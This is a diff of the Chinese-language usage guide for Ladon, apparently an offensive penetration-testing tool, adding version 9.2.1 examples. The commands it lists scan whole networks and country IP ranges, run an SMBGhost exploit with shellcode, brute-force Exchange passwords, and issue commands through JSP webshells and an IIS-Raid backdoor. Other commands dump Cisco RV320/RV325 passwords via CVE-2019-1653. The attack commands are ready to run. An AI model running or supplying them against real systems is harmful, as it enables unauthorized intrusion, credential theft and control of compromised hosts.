@@ -5,8 +5,8 @@ Windows版本: .Net、Cobalt Strike、PowerShell
 PS: GUI版主要方便本地测试使用，完整功能使用CMD
 
 ### 版本
-Ladon9.2.0 20220818
-简明用法例子 168例
+Ladon9.2.1 20220911
+简明用法例子 171例
 
 ### 001 自定义线程扫描
 例子：扫描目标10.1.2段是否存在MS17010漏洞
@@ -50,8 +50,19 @@ Ladon domain.txt ICMP
 ##### 008 ICMP批量扫描机器是否存活
 Ladon host.txt ICMP
 
-##### 009 批量识别URL列表CMS
-Ladon url.txt WhatCMS
+##### 009 WhatCMS批量识别URL列表CMS识别、Banner、SSL证书、标题
+Ladon 192.168.1.8 WhatCMS   扫描IP
+Ladon 192.168.1.8/24 WhatCMS   扫描C段
+Ladon 192.168.1.8/C WhatCMS   扫描C段
+Ladon 192.168.1.8/B WhatCMS   扫描B段
+Ladon 192.168.1.8/A WhatCMS   扫描A段
+Ladon IP.TXT WhatCMS   扫描IP列表
+Ladon IP24.TXT WhatCMS   扫描C段列表
+Ladon IP16.TXT WhatCMS   扫描B段列表
+Ladon cidr.TXT WhatCMS   扫描整个国家IP段列表
+禁PING扫描
+Ladon noping 192.168.1.8 WhatCMS   扫描IP
+Ladon noping 192.168.1.8/24 WhatCMS   扫描C段
 
 ##### 010 批量检测DrayTek路由器版本、漏洞、弱口令
 Ladon url.txt DraytekPoc
@@ -268,7 +279,8 @@ Ladon ForExec "CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e --load-shellcode test.
 
 ### 文件下载、文件传输
 
-##### 071 HTTP下载
+##### 071 HTTP下载 HTTPS下载 MSF下载
+Ladon wget https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe
 Ladon HttpDownLoad http://k8gege.org/Download/Ladon.rar
 
 ##### 072 Ftp下载 	
@@ -650,7 +662,7 @@ Ladon url.txt WPinfo
 Ladon 192.168.1.1/c WPinfo
 Ladon 192.168.1.1/b WPinfo
 
-##### 164  ExchangeScan 识别Exchange密码爆破
+##### 164  Exchange暴力破解 识别Exchange密码爆破
 Ladon k8gege.org ExchangeScan
 Ladon 192.168.1.8 ExchangeScan
 Ladon 192.168.1.8、24 ExchangeScan
@@ -671,3 +683,15 @@ Ladon WebShell jsp ua https://zimbra.k8gege.org pass whoami
 
 ##### 168 WebShellCmd 连接jsp WebShell(支持cd、k8、ua、uab64)
 Ladon WebShell jsp uab64 https://zimbra.k8gege.org pass whoami
+
+##### 169 非交互式连接IIS-Raid后门执行命令
+Ladon IISdoor http://192.168.1.142 whoami
+Ladon IISdoor http://192.168.1.142 SIMPLEPASS whoami
+
+##### 170 FindIP匹配IP段是否出现在漏洞结果中
+Ladon FindIP ipc.txt ISVUL.txt
+
+##### 171 CiscoDump CVE-2019-1653 Cisco RV320 RV325 Dump Password
+Ladon https://192.168.1.8 CiscoDump
+Ladon url.txt CiscoDump 批量探测Cisco漏洞并导出用户密码
+
